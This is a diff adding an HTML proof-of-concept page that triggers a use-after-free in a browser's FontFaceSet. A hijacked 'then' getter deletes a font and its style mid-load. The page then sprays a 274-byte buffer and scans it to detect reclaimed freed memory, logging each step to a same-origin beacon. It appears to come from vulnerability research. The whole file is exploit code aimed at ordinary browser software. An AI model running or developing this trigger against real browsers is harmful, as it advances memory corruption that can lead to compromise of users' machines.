@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>FontFaceSet UAF - offset 128 (verbatim #155 trigger)</title>
+<script>
+function __bp(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+__bp('F155BF-PARSE');
+window.onerror=function(msg,src,line){__bp('F155BF-ERROR-'+line+'-'+String(msg).slice(0,40));return false;};
+</script>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+(function(){
+  function run() {
+    b('F155BF-START');
+
+    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var st = document.createElement('style');
+    st.id = 'victim-style';
+    st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+    document.head.appendChild(st);
+    b('F155BF-SETUP');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired) return undefined;
+        fired = true;
+        b('F155BF-GETTER-ENTER');
+        var v = document.getElementById('victim-style');
+        if (v) { v.remove(); b('F155BF-STYLE-REMOVED'); }
+        try { document.fonts.delete(this); b('F155BF-DELETED-' + document.fonts.size); }
+        catch (e) { b('F155BF-DEL-ERR'); }
+        document.body.offsetHeight;
+        b('F155BF-LAYOUT-DONE');
+        window.__buf = new ArrayBuffer(274);
+        var u8 = new Uint8Array(window.__buf);
+        for (var k = 0; k < 274; k++) u8[k] = 0x41;
+        window.__victim = null;
+        b('F155BF-VICTIM-buf274');
+        var v2 = 'unknown';
+        try { v2 = document.fonts.check('1em x'); } catch (e) { v2 = 'throw'; }
+        b('F155BF-CHECK-' + v2);
+        b('F155BF-GETTER-RETURN');
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    b('F155BF-CALL-LOAD');
+    document.fonts.load('1em a, x', 'AB').then(
+      function(){ b('F155BF-RESOLVED'); },
+      function(){ b('F155BF-REJECTED'); }
+    );
+
+    setTimeout(function(){
+      b('F155BF-FORCE-PRE');
+      var div = document.createElement('div');
+      div.style.fontFamily = 'x';
+      div.textContent = 'TEST';
+      document.body.appendChild(div);
+      var h = div.offsetHeight;
+      b('F155BF-FORCE-POST-h' + h);
+      setTimeout(function(){
+        var u = new Uint8Array(window.__buf), diffs = 0, first = -1, fv = -1;
+        for (var i = 0; i < u.length; i++) {
+          if (u[i] !== 0x41) { diffs++; if (first < 0) { first = i; fv = u[i]; } }
+        }
+        b('F155BF-SCAN-len' + u.length + '-diffs' + diffs + '-first' + first + '-val' + fv);
+        try { b('F155BF-SIZE-' + document.fonts.size); } catch (e) {}
+      }, 200);
+    }, 100);
+  }
+  if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+  else document.addEventListener('DOMContentLoaded', run);
+})();
+</script>
+</head>
+<body><p>f155x</p></body>
+</html>
